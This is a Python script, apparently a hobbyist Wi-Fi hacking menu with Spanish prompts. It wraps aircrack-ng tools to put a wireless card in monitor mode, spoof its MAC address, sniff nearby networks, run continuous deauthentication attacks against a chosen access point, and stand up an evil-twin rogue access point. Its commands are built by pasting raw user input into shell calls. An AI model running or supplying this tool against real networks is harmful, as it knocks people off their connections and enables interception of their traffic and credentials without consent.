import subprocess
def banner():
	print("""
    ___    _                         
   /   |  (_)________  __  __        
  / /| | / / ___/ __ \/ / / /        
 / ___ |/ / /  / /_/ / /_/ /         
/_/  |_/_/_/  / .___/\__, /          
    __       /_/   _///__/_  ________
   / /_  __  __   / __ \/  |/  / ___/
  / __ \/ / / /  / /_/ / /|_/ /\__ \ 
 / /_/ / /_/ /  / _, _/ /  / /___/ / 
/_.___/\__, /  /_/ |_/_/  /_//____/  
      /____/                         


	""")
def config():
	global int
	global intmon
	int= input('Ingresa tu interfaz inalambrica: ')
	intmon= (int + 'mon')

def init():
	print("Configurando interfaz en modo monitor...")
	subprocess.call('airmon-ng check kill '+int, shell=True)
	subprocess.call('airmon-ng start '+int, shell=True)
	print("Cambiando MAC...")
	subprocess.call('ifconfig '+intmon+' down', shell=True)
	subprocess.call('macchanger -r '+intmon, shell=True)
	subprocess.call('ifconfig '+intmon+' up', shell=True)

def sniff():
	while(True):
		print("""
		1- Sniffear todas las redes wifi
		2- Sniffear una red wifi
		3- Regresar
		""")
		opt2= input('>>')
		if opt2 == '1':
			subprocess.call('airodump-ng '+intmon, shell=True)
		elif opt2 == '2':
			bssid= input("Ingrese la BSSID: ")
			cha= input("Ingrese el cana de la red: ")
			subprocess.call('airodump-ng --bssid '+bssid+' '+'-c '+cha+' '+intmon, shell=True)
		elif opt2 == '3':
			break

def deauth():
	a= input("Ingresa la MAC del AP: ")
	b= input("Ingresa el nombre de la red: ")
	subprocess.call('aireplay-ng --deauth 0 -a '+a+' '+'-e '+b+' '+intmon, shell=True)

def eviltwin():
	name= input("Ingrese el nombre de la red: ")
	chan= input("Ingrese el canal de la red: ")
	bssid2= input("Ingrese la BSSID de la red: ")
	subprocess.call('airbase-ng -a '+bssid2+' '+'--essid '+name+' '+'-c '+chan+' '+intmon, shell=True)

subprocess.call('clear')
banner()
config()

while(True):
	print("""
	1- Iniciar interfaz en modo monitor
	2- Sniffear redes wifi
	3- Ataque de desautenticacion
	4- EvilTwin
	5- Terminar tareas
	6- Salir
	""")
	opt= input('>> ')
	if opt == '1':
		init()
		
	elif opt == '2':
		sniff()
		
	elif opt == '3':
		deauth()

	elif opt == '4':
		eviltwin()

	elif opt == '5':
		print("Hack The Planet!")
		subprocess.call('airmon-ng stop '+intmon, shell=True)

	elif opt == '6':
		print("Hacking NASA...")
		print("Hacking NSA...")
		print("Hack all the things!")
		break

